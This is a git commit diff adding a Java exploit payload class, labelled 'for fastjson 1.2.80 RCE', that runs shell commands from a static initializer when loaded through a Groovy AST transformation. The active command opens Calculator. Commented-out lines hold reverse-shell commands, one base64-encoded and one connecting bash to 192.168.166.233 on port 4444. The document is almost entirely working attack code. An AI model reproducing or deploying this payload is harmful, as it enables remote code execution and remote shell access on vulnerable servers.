fc7c2fcbd4ba7ab7d5314410e6d1b2f845e8e2c5
m01e <tmacfalcon@gmail.com>
2023-02-24 22:40:31 +0800

    add AttackThatShit

--- src/main/java/AttackThatShit.java
+++ src/main/java/AttackThatShit.java
@@ -3,22 +3,29 @@ import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.codehaus.groovy.ast.ASTNode;
+import org.codehaus.groovy.control.SourceUnit;
+import org.codehaus.groovy.transform.ASTTransformation;
+import org.codehaus.groovy.transform.GroovyASTTransformation;
 
-public class AttackThatShit {
-    public AttackThatShit() {
+/**
+ * for fastjson 1.2.80 RCE
+ */
+@GroovyASTTransformation
+public class AttackThatShit implements ASTTransformation {
+    static {
         try {
 //            Runtime.getRuntime().exec("touch /tmp/sususu.txt");
             Runtime.getRuntime().exec("open -a Calculator");
 //            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}");
-
 //            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.166.233/4444 0>&1"});
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    public static void main(String[] args) {
-        AttackThatShit thatShit = new AttackThatShit();
-    }
+    @Override
+    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {
 
+    }
 }
